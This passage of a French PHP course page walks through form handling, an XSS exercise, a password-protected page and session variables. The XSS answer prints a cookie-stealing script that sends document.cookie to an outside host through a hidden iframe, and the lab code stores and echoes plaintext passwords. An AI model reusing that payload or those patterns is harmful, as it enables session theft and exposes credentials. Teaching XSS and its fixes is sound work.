					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9315;</small> &emsp; POST: &emsp; <i style="color:#115;">trasmission, récuperation, et affichage <small style="color:gray">( des données )</small></i> </b></span><br>
					&emsp;Dupliquer <b>form.php</b> en <b>form.1.php</b><br>
					<ul type="disc" class="questions_" >
                         <li>Dans <b>form.php</b>: Remplacer <b>GET</b> par <b>POST</b> </li>					
						 <li>Qu'est-ce qui change ?</li>						 
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
						 <div class="paragraphe">
						    &#8718; On ne voit pas les données(<small>du formulaire</small>) dans la barre d'adresse<br>
							&#8718; Je les r&eacute;çois dans une table <b>$_POST[ ]</b>
						 </div>
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9316;</small> &emsp; Failles XSS &emsp; <i style="color:#115;">Injection de code HTML/JS</i> </b></span><br>
					&emsp;<b style="line-height:1.5em">Vulnérabilté  du fichier traitement</b>(corps.php)<p></p>
					&emsp;Il peut être appelé par n'importe quelle page( pas seulement form.php)
					
					
					<ul type="disc" class="questions_" >
					     <li>Quelle conséquence ?! </li>
						 <li>Et si on met du code HTML dans le champs <b>nom</b> !</li>
						 <li>Et si on y gave du javascript !! </li>		
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
						 <div class="paragraphe" style="margin-bottom:0.4em !important;">
						    <ul type="square">
							   <li><b>Conséquence</b>: Modifier son contenu pour "passer" le formulaire de login </li>
							   <li><b>Injection HTML</b>: Une balise &lt;a&gt; pour rediriger l'utilisateur vers un autre site qui réaffiche la valeur du champs <b>Nom</b></li>
							   <li><b>Injection javaScript</b>: Voler le cookie contenant les paramètres de connexion( en utilisant une rédirection javaScript)</li>
							</ul>							
						 </div>
						 <span class="idS subQuestion t-transparent" style="margin-top:0 !important;; background:#d2f2df !important;">&nbsp;&nbsp;Exemple de vol de cookie par injection javaScript</span>
<pre><code class="language-html" ><source lang="html">
&lt;script>
     document.write('&lt;iframe src="https://www.lije-creative.com/volersession.php?'+ 
	 document.cookie + '" height="0" width="0" style="border:none;" />');
&lt;/script>	
</source></code></pre>
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="greenNum">&#9317;</small> &emsp; Fonctions &emsp; <i style="color:#115;"><b>html<span style="color:#990033">special</span>chars()</b>,&emsp; <b><span style="color:#990033">strip_tags()</span></b></i> </b></span><br>
					&emsp;Comment résoudre le problème précédent ?<br>
					<span style="line-height:1.5em; color:transparent;">...</span>
					<details>
					    <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
						<ul type="none" class="questions_" style="padding-left:2.8em;" >
							 <li>
							     &#9193; &Eacute;chapper le code HTML transmis : fonction&emsp; <b>html<span style="color:#990033">special</span>chars()</b><br>
								 &emsp; Tester cette fonction
							 </li>

							 <li>
							     &#9193; Supprimer les balise HTML du champs : fonction&emsp; <b><span style="color:#990033">strip_tags()</span></b><br>
								 &emsp; Tester &eacute;galement cette fonction
							 </li>		
						</ul>
					</details>
					<p></p>

					
				</div>
				
				
				
				
				
                <!-- Exercice3 -->
				<div class="danger_ structureSujet">
					<p><u><a href="#"><strong>Exo3:</strong> Prot&eacute;ger une page par mot de passe</a> </u> &emsp;strcmp() </p>					
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="redNum">&#9312;</small> &emsp; HTML: &emsp; <i style="color:#115;">Saisie <small style="color:gray">( interface d'entrée )</small></i> </b></span><br>
					&emsp;Ajouter une page <b>form<span style="color:#a1008c">ulaire</span>.php</b> contenant:<br>
					<ul type="disc" class="questions_" >
					     <li>Un titre</li>
                         <li>Un formulaire avec un champs "<b>mot de passe</b>" et un champs "<b>Acc&eacute;der</b>"  </li>					
						 <li>Le champs "<b>Acc&eacute;der</b>" appelle la page <b>pageProtegee.php</b>(par POST)</li>						 
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-html" ><source lang="html">
/********  formulaire.php ******/
&lt;!DOCTYPE html>
&lt;html>
&lt;head>
	&lt;title>TP2: Exercice3&lt;/title>
&lt;/head>
&lt;body>
	&lt;form action="pageProtege.php" method="post">
		Password: &lt;input type="password" name="password">		
	    &lt;input type="submit" name="submit" value="Acéder">
	&lt;/form>
&lt;/body>
&lt;/html>	
</source></code></pre>
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="redNum">&#9313;</small> &emsp; PHP: &emsp; <i style="color:#115;">Traitement <small style="color:gray">( fichier externe )</small></i> </b></span><br>
					&emsp;Ajouter la page <b><span style="color:#a1008c">pageProtegee.php</span></b> qui, <br>
					<ul type="disc" class="questions_" >
					     <li> affiche un texte si le mot d'passe est correcte </li>
                         <li> affiche un message d'erreur le cas &eacute;ch&eacute;ant  </li>											 
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-php" ><source lang="php">
/********  pageProtege.php ******/
&lt;div id="contenu">
	&lt;h3> TP2: Exercice3&lt;/h3>
&lt;/div>
&lt;?php  
  // COLLECT 
  $motdepasse = 'abc';
  $password=isset($_POST["password"]) ? $_POST["password"]:'';
   
  // CONTRÔLE DE SAISIE
  if(empty($password)) echo 'Entrer votre password&lt;br>';
   
  // AFFICHAGE
  $resultat = strcmp($motdepasse,$password);
  if ($resultat !== 0) echo 'mot de passe erroné';		   
  else  echo 'le cheval de Henti Iv était blanc';
?>
&lt;p>&lt;a href="formulaire.php"> Formulaire de saisie &lt;/a>&lt;/p>
</source></code></pre>					
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="redNum">&#9314;</small> &emsp; HTML/PHP: &emsp; <i style="color:#115;">Saisie et traitement <small style="color:gray">( dans le même fichier )</small></i> </b></span><br>
					&emsp;Reprendre la page <b>form<span style="color:#a1008c">ulaire</span>.php</b> :<br>
					<ul type="disc" class="questions_" >
					     <li>Dedans, ins&eacute;rer le contenu de la page <span style="color:#a1008c">pageProtegee.php</span></li>
                         <li>Le formulaire pointe donc sur lui-même</li>											 
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-php" ><source lang="php">
/********  formulaire.php ******/
&lt;!DOCTYPE html>
&lt;html>
&lt;head>
	&lt;title>TP2: Exercice3&lt;/title>
&lt;/head>
&lt;body>
	&lt;form action="pageProtege.php" method="post">
		Password: &lt;input type="password" name="password">		
	    &lt;input type="submit" name="submit" value="Acéder">
	&lt;/form>
&lt;/body>
&lt;/html>
    <hr>	
&lt;?php  
  $motdepasse = 'abc';
  
  if(isset($_POST["password"]) && !empty($_POST["password"])){		
		// COLLECTE
		$password = $_POST["password"];
		// AFFICHAGE
		$resultat = strcmp($motdepasse,$password);
		if ($resultat !== 0) echo 'mot de passe erroné';		   
		else  echo 'le cheval de Henti Iv était blanc';	
  }
?>	
</source></code></pre>
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="redNum">&#9315;</small> &emsp; Conclusion:  </b></span><br>
				    <ul type="square" class="paragraphe petitParagraphe"> 
					  <li>
					     <b>Traitement dans le même fichier :</b><br>
                         Pour eviter les erreurs "<b style="color:#990033">Notice indefined variable</b>":<br> 
	                     Mettre tout le code à l'interieur d'<u>une grosse boucle</u> <b>if</b> qui teste la variable réçue, en utilisant <b>isset()</b> et <b>!empty()</b>
					  </li>
					  <li>
					     <b>Traitement dans un autre fichier :</b><br>
						 	On peut éviter ces <b style="color:#990033">erreurs</b> sans se taper <u>la grosse boucle</u>.
							i suffit d'utiliser l'opérateur ternaire pour insptecter les variable :<br>
							<code class="idS">$variable <b  style="color:#990033">=</b> isset($_POST["name"]) <b class="idS" style="color:#990099">?</b> $_POST["name"] <b class="idS" style="color:#990099">:</b> '';</code>
					  </li>
				    </ul><br>
				
				</div>
				
				
				
				
                <!-- Exercice4 -->
				<div class="info_ structureSujet">
					<p><u><a href="#"><strong>Exo4:</strong> Variables superglobales(les sessions)</a></u></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9312;</small> &emsp; Variable &emsp; <i style="color:#115;">SUPERGLOBALE</i> </b></span><br>
					&emsp;Qu'est-ce qu'une variable superglobale ?<br>
					<span style="line-height:1.5em; color:transparent;">...</span>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
						 <div class="paragraphe petitParagraphe">
						     Variable  accessibles n’importe où dans le script: &Agrave; l'intéieur des fonction(contexte locale) et à l'extérieur des fonctions(contexte global). <br><br>
							 <small>C'pas moi qui défini cette variable! Elle existe déjà prédéfinie dans le moteur PHP</small>
						 </div>
					</details>
					<p></p>
					
					&emsp;Les principales sont:<br>
					<ul type="square" class="questions_" >
                         <li>&dollar;_SERVER</li>
                         <li>&dollar;_ENV</li>
						 <li>&dollar;_SESSION</li>
						 <li>&dollar;_COOKIES</li>
						 <li>&dollar;_GET, &dollar;POST</li>
						 <li>&dollar;_FILE</li>
						 <li><b>En dire deux mots ...</b></li> 						  
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
						 <div class="paragraphe moyenParagraphe">
						    <ul type="square" class="questions_" >
								 <li><b>&dollar;_SERVER : Variables définies par le serveur </b> </li>
								 <ul type="disc">
								    <li>$_SERVER['<b style="color:#990033">PHP_SELF</b>'] &equiv; fichier(<small style="color:gray"> qui contient le script</small>)</li>
									<li>$_SERVER['<b style="color:#990066">SERVER_NAME</b>'] &equiv; serveur(<small style="color:gray"> qui héberge le fichier</small>)</li>
									<li>$_SERVER['<b style="color:#660033">SERVER_ADDR</b>'] &equiv; serveur(<small style="color:gray"> qui héberge le fichier</small>)</li>
									<li>$_SERVER['<b style="color:#990099">REMOTE_ADDR</b>'] &equiv; @IP(<small style="color:gray"> du visiteur </small>)</li>
									<li>$_SERVER['<b style="color:#660066">REQUEST_TIME</b>']&equiv; durée(<small style="color:gray"> de la requête</small>)</li>
								 </ul>
								 <li><p></p><b>&dollar;_ENV : Environnement où s'exécute le script </b> </li>
								 <ul type="disc">				 
									 <li>
										$_ENV['<b style="color:#660033">USER</b>'] &equiv; visiteur(<small style="color:gray"> qui éxecute le script </small>)
									 </li>
								 </ul>
								 <li>
								    <p></p><b>&dollar;_FILE : Va contenir des informations sur un fichier téléchargé !</b><br>
									<span style="color:#555">On pourra donc utiliser cette superglobale lorsqu’on offre la possibilité à nos utilisateurs de nous envoyer des fichiers.</span>
								 </li>	
                                 <ul type="disc">
								     <li>Ce, afin d’obtenir des informations sur les fichiers envoyés au serverveur web( type du fichier, sa taille, son nom, ... etc ) </li>
									 <li>ou même pour filtrer et interdire l’envoi de certains fichiers</li>
								 </ul>								 
								 <li><p></p><b>&dollar;_SESSION: &emsp;</b> <span style="color:#666">Transmissions de donnéees entre pages</span></li>
								 <li><b>&dollar;_GET : &emsp;&emsp;&emsp;</b> <span style="color:#777">Transmissions de donnéees entre pages</span></li>
								 <li><b>&dollar;_POST : &emsp;&emsp;&nbsp;&nbsp;</b> <span style="color:#888">Transmissions de donnéees entre pages</span></li>                               
								 <li>
								    <p></p>
								    <b>&dollar;_COOKIES</b>
									<div class="paragraphe petiPragraphe" style="padding:0 0 0 1.5em; padding-top:0; margin-top:0; border:none;">
									    Un cookie est un fichier qui est déposé par votre navigateur sur votre ordinateur lorsque vous surfez sur Internet. 
										<hr width=60% size=1><b><i style="calibri ligh; font-size:1.2em;"><small>Ce fichier sert à stocker et récupérer des informations sur vos habitudes de navigation</small></i></b>
										<hr width=60% size=1>C'est le navigateur qui va enregistrer le fichier sur votre disque dur(car le serveur n'a pas accès directement à votre ordinateur)
									</div>
								 </li>								 								 
					        </ul>
							
						 </div>
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9313;</small> &emsp; Valeur &emsp; <i style="color:#115;">REMOTE_ADDR</i> </b></span><br>
					&emsp;&Agrave; quoi sert la valeur contenu dans <b>&dollar;_SERVER['<span style="color:#f44336;">REMOTE_ADDR</span>']</b> ?<br>
					<span style="line-height:1.5em; color:transparent;">...</span>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
						 <div class="paragraphe petitParagraphe">
						    @IP du visiteur qui demande la page
						 </div>
						 
					</details>
					<p></p>
					<span class="idS subQuestion t-transparent" style="margin-top:0 !important; margin-bottom:1em !important; width:91.91%;"> &nbsp;<b style="color:gray"><small class="blueNum">&#9314;</small> &emsp; Variable &emsp; <i style="color:#115;">&dollar;_SESSION</i> </b></span><br>
					&emsp;3.1 &Agrave; quoi sert la variable <b>&dollar;_SESSION</b> ?<br>
					<span style="line-height:1.5em; color:transparent;">...</span>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
						 <div class="paragraphe petitParagraphe">
						    Pour conserver des variables sur toutes les pages du site et pendant toute la durée de présence de
                            l’internaute, on utilise les sessions (plus facile qu’avec GET ou POST).
							<b><br>
							  Normalement, la session est détruite ou à la <u>fermeture du navigateur</u>, ou au bout de <u>30 minutes</u>. Cette valeur peut être modifiée dans le fichier php.ini du serveur.
							</b><br>
							Les informations sont stockées dans des fichiers sur le serveur. &Agrave; chaque session correspond un fichier.
						 </div>
					</details>
					<p></p>
					
					&emsp;3.2 Ajouter un fichier <b>login.php</b> contenant 3 variables session:<br>
					<ul type="square" class="questions_" >
						 <li>&dollar;_SESSION['<span style="color:gray">nom</span>']</li>
						 <li>&dollar;_SESSION['<span style="color:gray">prenom</span>']</li>
						 <li>&dollar;_SESSION['<span style="color:gray">motPasse</span>']</li>
						 <li><b>login.php</b> est accessible par un lien depuis <b>corps.php</b> </li> 						  
					</ul>
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-php" ><source lang="php">
/********  login.php ******/
&lt;?php  
  session_start();
  
  $_SESSION['nom'] = "nom";
  $_SESSION['prenom'] = "prenom";
  $_SESSION['motPasse'] = "motPasse";	
?>
</source></code></pre>	
					</details>
					<p></p>
					
					&emsp;3.3 Reprendre le fichier <b>index.php</b> qui, maintenant appelle:<br>
					<ul type="square" class="questions_" >
						 <li>entete<span style="color:gray">.php</span></li>
						 <li>login<span style="color:gray">.php</span></li>
						 <li>piedPage<span style="color:gray">.php</span></li>
						 <li>Comme le montre la figure suivante: </li> 						  
					</ul>
					<ul type="none" class="questions_" >
					  <li><img src="index.png" class="img"/></li>
					</ul>
					<details>
					<summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-php" ><source lang="php">
/********  login.php ******/
&lt;?php  
    include 'entete.php';
    include 'login.php';
    include 'piedPage.php';	
?>
</source></code></pre>	
					</details>
					<p></p>

					&emsp;3.4 Reprendre la page <b>login.php</b> qui, maintenant:<br>
					<ul type="square" class="questions_" >
					  <li>Pointe sur elle-même.</li>
					  <li>Ajouter un lien vers <span style="color:#990033">infos.php</span></li>
					</ul>
					<details>
					<summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-php" ><source lang="php">
/********  login.php ******/
&lt;?php session_start(); ?>

&lt;!DOCTYPE html>
&lt;html>
&lt;head>
	&lt;title>TP2: Exercice4&lt;/title>
&lt;/head>
&lt;body>
 &lt;h3>Travail sur les sessions&lt;/h3>
 &lt;p> Merci de saisir vos coordonnées </p>
 &lt;form action="" method="post">		 
    &lt;p> Nom&amp;emsp;:&lt;input type="text" name="nom">&lt;/p>
    &lt;p> Prénom:&lt;input type="text" name="prenom">&lt;/p>
    &lt;p> Pass:&lt;input type="password" name="motPass">&lt;/p>
    &lt;p> &lt;input type="submit" name="submit" value="Accéder">&lt;/p>
    &lt;input type="button" value="Infos ..."
	       onclick="window.location.href='infos.php';" />	
 &lt;/form>
&lt;/body>
&lt;/html>

&lt;?php 
//La page pointe sur elle mm => on utilise la grosse boucle 
 if(isset($_POST['nom']) && !empty($_POST['nom'])){
   $_SESSION['nom'] = $_POST['nom'] ;
   $_SESSION['prenom'] = $_POST['prenom'] ;
   $_SESSION['motPasse'] = $_POST['motPasse'] ;
 }
?>
</source></code></pre>	
					</details>
					<p></p>
					&emsp;3.5 Dans <span style="color:#990033">infos.php</span> :<br>
					<ul type="square" class="questions_" >
					  <li>Afficher les 3 variables session.</li>
					  <li>Est-ce que <span style="color:#990033">infos.php</span> les voit bien?</li>
					  <li>Ajouter un lien de "Déconnexion" qui ramène l’internaute à la page index.php et qui supprime la session</li>
					  <li><b style="font-size:1em"><u>Indications</u></b>:</li>
					</ul>

					<ul type="none" class="questions_" style="margin-left:-1em; line-height:0.9 !important; " >
			
					  <li class="paragraphe petitParagraphe" style="background:#dbe7fe !important; margin-top:0; margin-bottom:0; ">
					     Pour ce faire, il faut une page de déconnexion intermédiaire (logout.php)
                         qui<br> -  va d’abord appeler la fonction unset($ SESSION)<br> - avant session destroy()
					  </li>
		
					  <li class="paragraphe petitParagraphe indication" style="margin:top:0; margin-left:-2em;">
					     L’appel à index.php se fait grâce à header(’Location: index.php’)
					  </li>
					  <li class="paragraphe petitParagraphe indication" style="margin-left:-2em;" >
					    header(’Location: index.php’)  permet de rediriger le navigateur 
					  </li>
					</ul>
					
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-php" ><source lang="php">
/********  infos.php ******/
&lt;?php  
   session_start(); 
   
   echo $_SESSION['nom'].'&lt;br>' ;	   
   echo $_SESSION['prenom'].'&lt;br>' ;
   echo $_SESSION['motPasse'].'&lt;br>';
?>
&lt;p>&lt;a href="logout.php"> Déconnexion &lt;/a>&lt;/p> 
</source></code></pre>

<pre><code class="language-php" ><source lang="php">
/********  logout.php ******/
&lt;?php  
   session_start(); 
   
   if(isset($_SESSION['nom']) && !empty($_SESSION['nom'])){
	   unset($_SESSION['nom']); 
	   unset($_SESSION['prenom']);
	   unset($_SESSION['motPasse']);
	   session_destroy(); 
    }  
   header('Location:index.php');
?>
</source></code></pre>
					</details>
					<p></p>
					&emsp;3.6 Dupliquer <span style="color:#990033">infos.php</span> en info2.php<br>
					<ul type="square" class="questions_" >
					  <li>Ajouter  dans login.php un lien vers la page infos2.php</li>
                      <li>
					        infos2.php va déconnecter l’utilisateur au bout de 30 secondes
							et afficher "Vous avez été déconnecté" 
					  </li>
					  <li>
					        Ensuite, si la session existe encore (donc avant l’écoulement des 30 secondes),
                            il faut afficher les informations de session (nom, prénom)
					  </li>                          							
					  <li><b style="font-size:1em"><u>Indications</u></b>:</li>
					</ul>
					<ul type="none" class="questions_" style="margin-left:-1em; line-height:0.9 !important;" >			
			
						  <li class="paragraphe petitParagraphe indication" style="margin:top:0; margin-left:-2em;">
							  Pour tester, vous pouvez rafraichir la page avant 30 secondes,
                              puis attendre 30 secondes et rafraichir de nouveau.

						  </li>
						  <li class="paragraphe petitParagraphe indication" style="margin-left:-2em;" >
							  Vous devriez voir apparaître le
                              message "Vous avez été déconnecté" la deuxième fois
						  </li>
					</ul>
					
					<ul type="square" class="questions_" >                         							
					  <li><b style="font-size:1em"><u>Nota bene</u></b>:</li>
					</ul>
					
					
					<ul type="none" class="questions_" style="margin-left:-1em; line-height:0.9 !important;" >
						  
						  <li class="paragraphe petitParagraphe notaBene"><!-- avant c't background:#d2f2df, après g mis white   -->
							  Pour faire la déconnexion automatique, servez vous de cette page :
							  <small><code>https://stackoverflow.com/questions/520237/how-do-i-expire-a-php-session-after-30-minutes</code></small>
							  avec le code :
<pre><code class="language-php" ><source lang="php">
if (isset($_SESSION[’LAST_ACTIVITY’]) && (time() - $_SESSION[’LAST_ACTIVITY’] > 30)){
session_unset(); 
session_destroy(); 
}
// Met à jour le timeStamp de la dernière activité
$_SESSION[’LAST_ACTIVITY’] = time(); 
</source></code></pre>
						  </li>
					</ul>
					
					<details>
					     <summary class="reponse_"><span >R&eacute;ponses ... </span></summary>
<pre><code class="language-php" ><source lang="php">
/********  login.php ******/
... 
&lt;?php 
  if(!isset($_SESSION['LAST_ACTIVITY']) && empty($_SESSION['LAST_ACTIVITY'])){
	$_SESSION['LAST_ACTIVITY'] = time();  
  }
?>
</source></code></pre>
<pre><code class="language-php" ><source lang="php">
/********  info2.php ******/ 
&lt;?php 
    session_start(); 
    // Ce if car après la déconnexion i veut pas de variables vides
	if (!empty($_SESSION['nom'])){ 
		echo $_SESSION['nom'].'&lt;br>' ;	   
		echo $_SESSION['prenom'].'&lt;br>' ;
		echo $_SESSION['motPasse'].'&lt;br>';    	
	    echo '&lt;p>&#9200; Actualiser pour voir la durée de votre session:&lt;b>'.(time() - $_SESSION['LAST_ACTIVITY']).' S&lt;/b>&lt;/p>';
	}	
	//Logout   
   	if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > 30)) {
        session_unset(); 
        session_destroy(); 
        echo '&lt;p>&lt;span style="color:red">&#9200;&lt;/span> Vous êtes déconnecté !&lt;/p>' ;			
	} 
?>
&lt;p>&lt;a href="index.php" style="text-decoration:none;"> &#9194; Connexion &lt;/a>&lt;/p>
</source></code></pre>		
					</details>
					<p></p>
					
				  </div>				  
			</section> <!-- FIN section1- conteneurDesSujet - PHP -->
		</main>
		
		<button onclick="topFunction()" id="myBtn" title="Go to top" >
		    <img  src="../../../photos/top.JPG" id="imageToTop">
	    </button>
		
		<hr width=100% color=whitesmoke style="display:inline-block;">
		<div class="conteneur-reponses" style="z-index:99 !important;"></div> 
	</div> <!-- div#contenair -->

	<!-- Blem de sticky quand la page remonte: Le footer supperpose les sidebars --> 
    <!-- Solution: cf sticky-bis.js/ligne31 -->           	
    <footer style="z-index:99 !important; text-align:left">

        <span style="padding:0 0 0 20.5em">Revue des installations <b style="color:gold">&#8227;&#8227;&#8227;</b> C:\wamp64\www\M1</span><br>
		<span style=" padding-left:8em; padding-right:18em; color:#8c8b8b; ">Inventaire ports apache (local host)</span>
		<span style="color:#8c8b8b;">URL ( 3 premiers TP )</span>
	    <div class="content-footer" style=" margin-top:-2.4em; " >         
            <div class="ndreda-footer" style="padding:0; background:white;"> 		  
				<img src="inventaire-ports-apache.png" class="img2" style="margin:1em; height:50%; width:40%; border-radius:0 0 0 10px; "/>

				<img src="chemin-tp.png" class="img2" style="margin:1em; height:50%; width:40%; border-radius:0 0 10px 0;  float:right; "/>
            </div>		
			<span class="copyright_"><span style="color:gray;">2019 &copy; -</span> Master Handi</span>
        </div><!-- conteneur-reponses Q1.1 -->	  
    </footer>
    <script type="text/javascript" src="../../../js/top.js"></script>
	<!-- <script type="text/javascript" src="../../../js/sticky-bis.js"></script> -->
    <script type="text/javascript" src="../../../js/sticky-bis.js"></script>	
  </body>
</html>